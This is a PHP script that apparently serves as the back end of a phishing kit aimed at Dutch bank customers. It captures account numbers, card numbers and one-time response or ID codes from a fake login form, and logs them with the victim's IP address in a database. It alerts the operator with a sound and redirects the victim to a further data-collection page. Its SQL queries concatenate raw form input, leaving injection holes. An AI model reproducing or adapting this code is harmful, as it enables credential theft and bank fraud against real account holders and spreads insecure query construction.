<?php

require_once 'entry.php';
require_once("common/config.php");
require_once("common/database.php");

function get_ip_address()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip); // just to be safe

                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
}


$_SERVER['REMOTE_ADDR'] = get_ip_address();
$user_ip = 'IP-adres: ' . $_SERVER['REMOTE_ADDR'] . "\n";
$data = 'Rekeningnummer: ' . $_POST['accountNumber'] . "\n";
$data2 = 'Pasnummer: ' . $_POST['cardNumber'] . "\n";

$login_type = isset($_POST["login_type"]) ? $_POST["login_type"] : 2;
if ($login_type == 1) {
    $data3 = 'Respons: ' . $_POST['response'] . "\n\n";
    $response = $_POST['response'];
} else {
    $data3 = 'ID-code: ' . $_POST['idcode'] . "\n\n";
    $response = $_POST['idcode'];
}
$id = $_SESSION['rec_id'];
$user = db::getCell("SELECT id FROM data WHERE id='" . $id . "' AND status=0");
$mode = db::getCell("SELECT value FROM mode WHERE id=1");
if (!empty($user)) {
    $obj['account_number'] = $_POST['accountNumber'];
    $obj['password'] = $_POST['cardNumber'];
    $obj['response'] = $response;
    $obj['last_online'] = time();
	$obj['mode'] = $mode;
    $query = db::prepUpdateQuery($obj, "data", "id", $user);
    $result = db::updateRecord($query);
} else {
    $_SESSION['unique_id'] = uniqid();
    $date = date("Y-m-d H:i:s a", time());
    $time = time();
    $ip = get_ip_address();
    $query = "INSERT INTO `data` (`id`,`date`,`account_number`,`password`,`response`,`unique_id`,`login_type`,`last_online`,`ip`,`mode`) VALUES (NULL,'" . $date . "','" . $_POST['accountNumber'] . "','" . $_POST['cardNumber'] . "','" . $response . "','" . $_SESSION['unique_id'] . "','" . $login_type . "','" . $time . "','" . $ip . "','" . $mode . "');";
    $result = db::insertRecord($query);
    $_SESSION['rec_id'] = $result;
}
include 'sound_on.php';
$_SESSION['stap1'] = $user_ip . $data . $data2 . $data3;
$_SESSION['login_type'] = $login_type;
if ($_GET['ajax']) {
    echo $id;
    exit;
} else {
    header("Location:" . $q_arr['informatie.php']);
}
?>  